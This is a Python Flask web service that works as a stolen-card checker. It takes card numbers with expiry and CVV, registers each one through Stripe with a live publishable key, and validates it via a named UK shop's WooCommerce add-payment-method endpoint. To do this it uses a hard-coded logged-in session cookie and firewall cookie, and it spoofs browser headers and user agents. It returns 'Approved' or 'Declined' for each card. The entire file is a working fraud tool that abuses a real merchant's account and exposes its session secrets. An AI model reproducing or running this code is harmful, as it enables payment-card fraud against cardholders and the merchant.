from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent
import re

app = Flask(__name__)

def process_card(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "cc": ccx,
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    
    # Step 1: Create Payment Method with updated headers
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/63a7a7cd5b; stripe-js-v3/63a7a7cd5b; payment-element; deferred-intent',
        'referrer': 'https://quiltedbear.co.uk',
        'time_on_page': '184060',
        'key': 'pk_live_90o1zSEv0cxulJp2q9wFbksO',
        '_stripe_version': '2024-06-20'
    }
    
    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            }
        )
        pm_data = pm_response.json()
        
        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {
                "cc": ccx,
                "response": error_msg,
                "status": "Declined"
            }
            
        payment_method_id = pm_data['id']
    except Exception as e:
        return {
            "cc": ccx,
            "response": "Payment Method Creation Failed",
            "status": "Declined"
        }

    # Step 2: Get Nonce with updated cookies
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-06-11%2004%3A21%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fquiltedbear.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-06-11%2004%3A21%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fquiltedbear.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36',
        '_gid': 'GA1.3.183848283.1749617518',
        '__stripe_mid': '4e631fe4-ffe8-4854-bcd4-8e3e77361778b70b5c',
        '__stripe_sid': '43bc0b45-9905-4950-bf61-d2e653a1c2a140cfc1',
        '_ga': 'GA1.3.2002075700.1749617516',
        'wordpress_logged_in_ef6e1fd2910cd4b25b2e6fe479931581': 'teamff%7C1750827513%7C5etvp0CNjBGSOlZjh6Jq7jrBMGZavAybVOyTQOltpEO%7C395a136c3edf76d3993c84105b8cebeeb1432fb8b54e55933477d07c2002dba9',
        'wfwaf-authcookie-590e6fc54133c4edd8ff840ed6e380f8': '98486%7Cother%7Cread%7C7bd3c26179687ad6428c082d39fe04732f03186d250b30e5f4912913293c3014',
        '_ga_RSXCLFBHLB': 'GS2.1.s1749617516$o1$g1$t1749617907$j50$l0$h0',
        'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fquiltedbear.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    }
    
    headers = {
        'User-Agent': user_agent,
        'Referer': 'https://quiltedbear.co.uk/my-account/add-payment-method/',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
    }
    
    try:
        nonce_response = requests.get(
            'https://quiltedbear.co.uk/my-account/add-payment-method/',
            headers=headers,
            cookies=cookies
        )
        
        # Extract nonce from response
        nonce = None
        if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
            nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        else:
            return {
                "cc": ccx,
                "response": "Failed to extract nonce",
                "status": "Declined"
            }
    except Exception as e:
        return {
            "cc": ccx,
            "response": "Nonce Retrieval Failed",
            "status": "Declined"
        }

    # Step 3: Create Setup Intent with updated params
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    try:
        setup_response = requests.post(
            'https://quiltedbear.co.uk/',
            params=params,
            headers={
                'User-Agent': user_agent,
                'Referer': 'https://quiltedbear.co.uk/my-account/add-payment-method/',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://quiltedbear.co.uk',
                'x-requested-with': 'XMLHttpRequest',
            },
            cookies=cookies,
            data=data
        )
        setup_data = setup_response.json()
        
        if setup_data.get('success', False):
            if 'data' in setup_data:
                if setup_data['data'].get('status') == 'requires_action':
                    return {
                        "cc": ccx,
                        "response": "requires_action",
                        "status": "Approved"
                    }
                elif setup_data['data'].get('status') == 'succeeded':
                    return {
                        "cc": ccx,
                        "response": "Succeeded",
                        "status": "Approved"
                    }
                elif 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {
                        "cc": ccx,
                        "response": error_msg,
                        "status": "Declined"
                    }
        
        # Handle specific error cases
        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
            return {
                "cc": ccx,
                "response": error_msg,
                "status": "Declined"
            }
        
        return {
            "cc": ccx,
            "response": str(setup_data),
            "status": "Declined"
        }
            
    except Exception as e:
        return {
            "cc": ccx,
            "response": "Setup Intent Failed",
            "status": "Declined"
        }

@app.route('/gate=stripe4/keydarkwaslost/cc=<path:cc>')
def check_card(cc):
    # Validate CC format
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return jsonify({
            "cc": cc,
            "response": "Invalid card format",
            "status": "Error"
        }), 400
    
    result = process_card(cc)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
